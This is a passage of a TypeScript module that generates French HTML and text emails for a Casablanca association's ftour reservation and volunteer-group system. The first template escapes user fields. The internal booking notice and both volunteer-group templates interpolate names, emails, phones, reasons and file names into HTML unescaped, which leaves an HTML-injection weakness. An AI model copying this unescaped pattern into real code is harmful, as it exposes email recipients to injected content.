        </tr>
      </table>
    `
    : "";

  const content = `
    <div style="display:none;max-height:0;overflow:hidden;opacity:0;color:transparent;">Nous n’avons pas pu confirmer votre réservation pour ce créneau.</div>
    <h2 style="color:#5d5a3c;margin:0 0 18px 0;font-size:24px;">Réservation non disponible</h2>
    <p style="margin:0 0 16px 0;color:#374151;font-size:16px;line-height:1.6;">Bonjour <strong>${escapeHtml(data.firstName)}</strong>,</p>
    <p style="margin:0 0 16px 0;color:#374151;font-size:16px;line-height:1.6;">
      Merci pour votre demande de réservation à <strong>${escapeHtml(brandName)}</strong>.<br>
      Malheureusement, nous ne pouvons pas confirmer votre réservation pour le créneau demandé.
    </p>

    <table role="presentation" style="width:100%;border-collapse:collapse;background-color:#f5f5f0;border-radius:8px;margin:20px 0;">
      <tr>
        <td style="padding:20px;">
          <h3 style="margin:0 0 12px 0;color:#5d5a3c;font-size:18px;">📋 Votre demande</h3>
          <p style="margin:5px 0;color:#374151;"><strong>Date :</strong> ${escapeHtml(data.reservationDateLong)}</p>
          ${data.reservationTime ? `<p style="margin:5px 0;color:#374151;"><strong>Heure :</strong> ${escapeHtml(data.reservationTime)}</p>` : ""}
          <p style="margin:5px 0;color:#374151;"><strong>Nombre de personnes :</strong> ${data.partySize}</p>
          ${data.reference ? `<p style="margin:5px 0;color:#374151;"><strong>Référence :</strong> ${escapeHtml(data.reference)}</p>` : ""}
          <p style="margin:5px 0;color:#374151;"><strong>Statut :</strong> Non disponible</p>
        </td>
      </tr>
    </table>

    ${reasonHtml}

    <table role="presentation" style="width:100%;border-collapse:collapse;background-color:#f0f4e8;border:1px solid #d5ddc8;border-radius:8px;margin:18px 0;">
      <tr>
        <td style="padding:18px;">
          <h3 style="margin:0 0 8px 0;color:#3f5320;font-size:17px;">Solutions proposées</h3>
          <p style="margin:0;color:#374151;font-size:15px;line-height:1.6;">
            Si vous le souhaitez, vous pouvez :<br>
            • choisir une autre date/créneau,<br>
            • ajuster le nombre de personnes,<br>
            • ou nous contacter pour une proposition alternative.
          </p>
        </td>
      </tr>
    </table>

    ${actionButtonHtml}

    <p style="margin:16px 0 0 0;color:#374151;font-size:15px;line-height:1.6;">Contact : ${escapeHtml(data.contactEmail)} · ${escapeHtml(data.contactPhone)}</p>
    <p style="margin:16px 0 0 0;color:#374151;font-size:16px;line-height:1.6;">Merci pour votre compréhension,<br><strong>L’équipe de ${escapeHtml(brandName)}</strong></p>
  `;

  const footerText = (data.footerLines && data.footerLines.length > 0)
    ? data.footerLines.join("\n")
    : "Association Bab Rayan\n4 rue Bayt Lahm, quartier Palmier, Casablanca\nTél: +212 (0) 666-690534 | contact@ftourbabrayan.ma";

  const text = [
    "Nous n’avons pas pu confirmer votre réservation pour ce créneau.",
    "",
    `Bonjour ${data.firstName},`,
    `Merci pour votre demande de réservation à ${brandName}.`,
    "Malheureusement, nous ne pouvons pas confirmer votre réservation pour le créneau demandé.",
    "",
    "Votre demande",
    `- Date : ${data.reservationDateLong}`,
    ...(data.reservationTime ? [`- Heure : ${data.reservationTime}`] : []),
    `- Nombre de personnes : ${data.partySize}`,
    ...(data.reference ? [`- Référence : ${data.reference}`] : []),
    "- Statut : Non disponible",
    "",
    ...(data.rejectionReason ? ["Pourquoi ?", `${data.rejectionReason}`, ""] : []),
    "Solutions proposées",
    "Si vous le souhaitez, vous pouvez :",
    "- choisir une autre date/créneau,",
    "- ajuster le nombre de personnes,",
    "- ou nous contacter pour une proposition alternative.",
    "",
    ...(data.rescheduleUrl ? [`Choisir un autre créneau : ${data.rescheduleUrl}`, ""] : []),
    `Contact : ${data.contactEmail} · ${data.contactPhone}`,
    "",
    "Merci pour votre compréhension,",
    `L’équipe de ${brandName}`,
    "",
    footerText,
  ].join("\n");

  return {
    subject,
    html: baseTemplate(content).replace(
      "linear-gradient(135deg, #166534 0%, #15803d 100%)",
      "#556B2F",
    ),
    text,
  };
}



// ============================================
// EMAILS INTERNES - NOTIFICATIONS À L'ÉQUIPE
// ============================================

/**
 * Email interne : Nouvelle demande reçue
 * Envoyé à l'équipe à chaque nouvelle demande
 */
export interface NewBookingNotificationData {
  type: 'particulier' | 'entreprise' | 'groupe';
  date: string;
  participantsCount: number;
  contactName: string;
  contactEmail: string;
  contactPhone: string;
  reference: string;
  companyName?: string;
  displayChoice?: string;
}

export function generateNewBookingNotificationEmail(data: NewBookingNotificationData): { subject: string; html: string } {
  const typeLabel = {
    particulier: 'Particulier',
    entreprise: 'Entreprise',
    groupe: 'Groupe',
  }[data.type];

  const content = `
    <h2 style="color: #5d5a3c; margin: 0 0 20px 0; font-size: 24px;">
      📬 Nouvelle demande reçue
    </h2>
    
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f5f5f0; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #5d5a3c; margin: 0 0 15px 0; font-size: 18px;">📋 Détails de la demande</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Type :</strong> ${typeLabel}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Date :</strong> ${data.date}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Participants :</strong> ${data.participantsCount}</p>
          ${data.displayChoice ? `<p style="margin: 5px 0; color: #374151;"><strong>Salle :</strong> ${data.displayChoice}</p>` : ''}
          ${data.companyName ? `<p style="margin: 5px 0; color: #374151;"><strong>Entreprise :</strong> ${data.companyName}</p>` : ''}
          <p style="margin: 5px 0; color: #374151;"><strong>Contact :</strong> ${data.contactName}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Email :</strong> ${data.contactEmail}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Téléphone :</strong> ${data.contactPhone}</p>
          <p style="margin: 10px 0 0 0; color: #6b7280; font-size: 14px;"><strong>Référence :</strong> ${data.reference}</p>
        </td>
      </tr>
    </table>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      ⏳ À traiter dans les 48 heures.
    </p>
  `;

  return {
    subject: `📬 Nouvelle demande ${typeLabel} - ${data.date}`,
    html: baseTemplate(content),
  };
}


// ============================================
// EMAIL POUR INSCRIPTION GROUPE BÉNÉVOLE
// ============================================

export interface GroupRegistrationEmailData {
  groupName: string;
  responsibleName: string;
  responsibleEmail: string;
  responsiblePhone: string;
  estimatedSize?: number;
  volunteerSlots: string[];
  dayNumber?: number;
  dayDate?: string;
  startTime?: string;
  fileName: string;
}

export interface GroupRefusalEmailData {
  responsibleName: string;
  groupName: string;
  dayNumber?: number;
  rejectionReason?: string;
}

export function generateGroupRefusalEmail(data: GroupRefusalEmailData): { subject: string; html: string } {
  const content = `
    <h2 style="color: #991b1b; margin: 0 0 20px 0; font-size: 24px;">
      Demande groupe bénévole non retenue
    </h2>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Cher(e) <strong>${data.responsibleName}</strong>,
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Nous avons bien étudié votre demande d'inscription groupe <strong>${data.groupName}</strong>${data.dayNumber ? ` pour le jour ${data.dayNumber} du Ramadan` : ''}.
      Malheureusement, nous ne pouvons pas y donner suite.
    </p>

    ${data.rejectionReason ? `
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef2f2; border-radius: 8px; margin: 20px 0; border: 1px solid #fca5a5;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #991b1b; margin: 0 0 10px 0; font-size: 16px;">Motif</h3>
          <p style="margin: 0; color: #374151; font-size: 15px; line-height: 1.6;">${data.rejectionReason}</p>
        </td>
      </tr>
    </table>` : ''}

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Pour toute question, n'hésitez pas à nous contacter à <a href="mailto:contact@ftourbabrayan.ma" style="color: #166534;">contact@ftourbabrayan.ma</a>.
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      Cordialement,<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `Votre demande groupe bénévole – ${data.groupName}`,
    html: baseTemplate(content),
  };
}

export function generateGroupRegistrationEmail(data: GroupRegistrationEmailData): { subject: string; html: string } {
  const times = computeSlotTimes(data.startTime || '18h00');
  const slotLabels: Record<string, string> = {
    preparation_ftour: `Préparation ftour (${times.prepStart} – ${times.prepEnd})`,
    service_ftour: `Service ftour (${times.serviceStart} – ${times.serviceEnd})`,
  };
  const slotsHtml = data.volunteerSlots.map(s =>
    `<li style="margin-bottom: 4px;">${slotLabels[s] || s}</li>`
  ).join('');

  const content = `
    <h2 style="color: #166534; margin: 0 0 20px 0; font-size: 24px;">
      Nouvelle inscription groupe bénévole
    </h2>

    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f0fdf4; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #166534; margin: 0 0 15px 0; font-size: 18px;">Informations du groupe</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Nom du groupe :</strong> ${data.groupName}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Responsable :</strong> ${data.responsibleName}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Email :</strong> <a href="mailto:${data.responsibleEmail}">${data.responsibleEmail}</a></p>
          <p style="margin: 5px 0; color: #374151;"><strong>Téléphone :</strong> ${data.responsiblePhone}</p>
          ${data.estimatedSize ? `<p style="margin: 5px 0; color: #374151;"><strong>Taille estimée :</strong> ${data.estimatedSize} personnes</p>` : ''}
          ${data.dayNumber ? `<p style="margin: 5px 0; color: #374151;"><strong>Jour :</strong> ${data.dayNumber} du Ramadan${data.dayDate ? ` (${data.dayDate})` : ''}</p>` : ''}
          ${slotsHtml ? `<p style="margin: 10px 0 5px 0; color: #374151;"><strong>Créneaux choisis :</strong></p><ul style="margin: 0; padding-left: 20px; color: #374151;">${slotsHtml}</ul>` : ''}
        </td>
      </tr>
    </table>

    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #eff6ff; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #1e40af; margin: 0 0 10px 0; font-size: 18px;">Fichier joint</h3>
          <p style="margin: 0; color: #374151;">
            Le fichier <strong>${data.fileName}</strong> contenant la liste des bénévoles est joint à cet email.
          </p>
        </td>
      </tr>
    </table>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Veuillez traiter cette inscription groupe dans les meilleurs délais.
    </p>
  `;

  return {
    subject: `[Bénévoles][Groupe] Nouvelle inscription groupe – ${data.groupName}`,
    html: baseTemplate(content),
  };
}
